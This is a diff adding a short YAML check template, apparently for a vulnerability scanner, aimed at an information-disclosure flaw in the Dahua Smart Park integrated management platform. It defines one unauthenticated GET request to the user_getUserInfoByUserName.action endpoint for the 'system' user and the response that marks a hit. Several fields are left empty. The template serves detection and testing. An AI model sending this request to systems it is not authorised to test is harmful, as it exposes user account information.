@@ -1,0 +1,21 @@
+id:
+
+info:
+  name: 大华智慧园区综合管理平台user_getUserInfoByUserName.action信息泄露漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /admin/user_getUserInfoByUserName.action?userName=system
+  headers:
+    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    Accept-Encoding: gzip, deflate
+    Connection: close
+response1:
+  headers:
+  body: system
+  code: 200
+requests2:
+response2:
